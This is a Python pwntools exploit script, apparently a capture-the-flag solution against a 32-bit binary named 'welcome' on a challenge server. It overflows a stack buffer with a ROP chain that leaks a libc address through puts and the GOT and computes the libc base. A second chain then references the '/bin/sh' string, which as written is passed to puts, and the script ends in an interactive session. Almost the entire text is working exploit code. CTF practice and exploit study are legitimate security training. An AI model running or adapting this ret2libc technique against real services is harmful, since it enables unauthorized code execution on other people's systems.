from pwn import *
#import pdb
exe = context.binary = ELF('welcome')

#libc = ELF('/lib/i386-linux-gnu/libc.so.6')    	
libc = ELF('libc6_2.27-3ubuntu1.4_i386.so')    	

remotehost = ('ctf.fibonhack.it', 16003)

gdbscript ='''
b *0x08049200
'''.format(**locals())

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug(
            exe=exe.path, args=[exe.path] + argv,
            gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(*remotehost, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)
        
context.log_level = 'debug'
#ui.pause()

addr = exe.sym
addr_got = exe.got
addr_plt = exe.plt
ret_addr = 0x080490af
leave_ret_addr = 0x080490f5
pop_ebp_addr = 0x0804926b





while(True):
	io = start() #env={"SPORCASTACK":"A"*123}

	io.recvline()
	io.recvline()

	##### Generation of unique sequences ####
	g = cyclic_gen()
	#log.info(f"offset return address: {g.find(b'gaaa')}")
	'''
	### 	Buffer per exploitare libc 	###
	buff = flat({
	    24: p32(exe.plt.puts) + p32(pop_ebp_addr),
	    32: p32(addr_got.__libc_start_main),
	    36: p32(exe.plt.puts) + p32(pop_ebp_addr),
	    44: p32(addr_got.__isoc99_scanf),
	    110: b'A'
	})
	'''
	try:
		buff = flat({
		    24: p32(exe.plt.puts) + p32(pop_ebp_addr),
		    32: p32(addr_got.__libc_start_main),
		    36: p32(exe.sym.main),
		    110: b'A'
		})
		io.sendline(buff)
		
		libc_start_address = io.recvline().strip(b'\n')
		libc_start_address = u32(libc_start_address[:4])
		log.info(f"libc_start_address leakato: {libc_start_address}")
		libc.address = 0
		libc.address = libc_start_address - libc.sym.__libc_start_main 
		
		log.info(f"libc_address calcolato: {libc.address}")
		io.recvline()
		io.recvline()
		
		buff = flat({
		    24: p32(libc.sym.puts) + p32(exe.sym.main),
		    32: p32(next(libc.search(b'/bin/sh'))),
		    110: b'A'
		})
		
		
		io.sendline(buff)

	

		'''
		libc_start_address = io.recvline().strip(b'\n')

		__isoc99_scanf = io.recvline().strip(b'\n')

		libc_start_address = list(map(hex, unpack_many(libc_start_address, 32, endian='little', sign=False)))[0]
		log.info(f"libc_start_address leakato: {libc_start_address}")

		__isoc99_scanf = list(map(hex, unpack_many(__isoc99_scanf, 32, endian='little', sign=False)))[0]
		log.info(f"__isoc99_scanf leakato: {__isoc99_scanf}")
		'''
		#io.sendline(b'pwd')
		io.recvline()
		
		break
	except EOFError:
		io.close()
	

io.interactive()

